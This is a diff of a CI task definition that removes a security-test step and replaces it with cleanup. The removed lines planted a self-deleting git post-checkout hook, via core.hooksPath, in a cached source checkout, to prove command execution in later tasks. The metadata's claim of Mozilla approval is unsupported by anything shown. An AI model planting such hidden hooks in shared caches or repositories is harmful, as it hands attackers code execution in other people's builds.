@@ -20,15 +20,11 @@ tasks:
         - bash
         - -cx
         - >
-          set -e;
-          mkdir -p src;
-          if [ ! -d src/.git ]; then git init src; fi;
-          mkdir -p src/.git/audit-hooks;
-          printf '#!/bin/sh\nprintf TC_PRIV_CACHE_RCE_71c9ab:\nid\ngit config --unset core.hooksPath || true\nrm -rf .git/audit-hooks\n' > src/.git/audit-hooks/post-checkout;
-          chmod 755 src/.git/audit-hooks/post-checkout;
-          git -C src config core.hooksPath .git/audit-hooks
+          git -C src config --unset core.hooksPath || true;
+          rm -rf src/.git/audit-hooks;
+          printf TC_PRIV_CACHE_CLEAN_71c9ab
     metadata:
-      name: authorized self-removing cache id proof
-      description: Mozilla-approved non-destructive command execution validation
+      name: authorized cache proof cleanup
+      description: removes the self-removing test hook without invoking checkout
       owner: audit@example.invalid
       source: https://example.invalid/audit
